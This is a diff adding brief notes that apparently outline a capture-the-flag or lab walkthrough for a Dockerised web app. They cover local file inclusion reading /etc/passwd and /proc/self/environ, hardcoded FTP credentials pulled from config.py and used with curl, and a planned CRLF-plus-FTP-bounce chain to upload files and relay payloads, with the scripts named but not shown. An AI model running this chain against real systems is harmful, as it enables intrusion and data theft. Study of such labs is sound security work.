@@ -1,0 +1,46 @@
+Local Setup
+	grep -rl 172.20 . | xargs sed -i 's/172.20/172.29/g'
+	docker-compose -f docker-compose.yml up
+
+	curl http://localhost:8088/login
+
+	docker exec -it 62cb584017c4 sh
+
+Grepping files
+	# LFI in avatar field
+	python webserver_lfi.py
+		/etc/passwd
+		/proc/self/cmdline => app.py
+		/proc/self/environ => /app
+
+		app
+			app.py
+			config.py
+			forms.py
+			exts.py
+			models.py
+			utils.py
+
+	# config.py
+	def ftp_login(self):
+	    ftp = FTP()
+	    ftp.connect("172.20.0.2", 8877)
+	    ftp.login("fan", "root")
+	    return ftp
+
+	curl ftp://fan:root@172.29.0.2:8877
+		drwxrwxr-x   2 root     root         4096 Jan 21 13:14 files
+		-rw-rw-r--   1 root     root          464 Jan 21 13:14 ftp-server.py
+
+	# Get ftp-server.py, files/config.json
+	curl ftp://fan:root@172.29.0.2:8877/ftp-server.py
+
+In ftp-server.py
+handler.permit_foreign_addresses = True leads to FTP Bounce Attack (
+Active mode)
+
+
+CRLF + FTP Bounce Attack => upload files
+	ftp_upload.py
+CRLF + FTP Bounce Attack => Send payload to other server
+	ftp_bounce.py
